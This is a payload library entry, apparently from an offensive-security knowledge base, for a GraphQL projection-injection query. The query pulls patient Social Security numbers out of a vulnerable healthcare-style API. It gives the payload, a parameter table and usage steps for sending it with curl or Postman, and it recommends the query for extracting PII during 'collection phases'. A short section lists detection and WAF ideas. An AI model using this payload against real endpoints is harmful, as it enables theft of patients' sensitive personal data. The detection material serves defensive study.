---
id: 586f1efe-a897-4716-a526-e5b15d31204d
name: graphql-projection-injection-payload
type: code
language: json
verified: true
created_at: '2023-04-06T03:55:58.845191+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - graphql
  - injection
  - payload
validated: true
---

# graphql-projection-injection-payload

## Code

```json
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

## Description

This JSON-formatted GraphQL query payload injects MongoDB projection syntax into the 'options' parameter to force the inclusion of sensitive nested fields (e.g., patients.ssn) in the response, bypassing default query restrictions on a vulnerable GraphQL endpoint.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| patients.ssn | Projection to include SSN field from nested patients entity | {"patients.ssn": 1} |
| firstName lastName id | Standard fields to request for the parent entity (doctors) | N/A |
| patients{ssn} | Nested selection to retrieve SSNs | N/A |

## Usage

Embed this query string in an HTTP POST request body as the value of 'query' key, e.g., {"query": "..."}. Use with tools like curl or Postman against a GraphQL endpoint after schema reconnaissance. Ideal for extracting PII in healthcare or user data APIs during collection phases.

## Detection

- Log analysis for queries with escaped JSON in 'options' (e.g., \"patients.ssn\":1 patterns).
- Schema access logs showing unusual field inclusions or high data volume responses.
- WAF rules blocking projection-like syntax in GraphQL parameters.
- Endpoint monitoring for introspection followed by targeted extractions.

## Related

- [[procedures/GraphQL-Projection-Data-Extraction]]
- [[tools/cURL]]
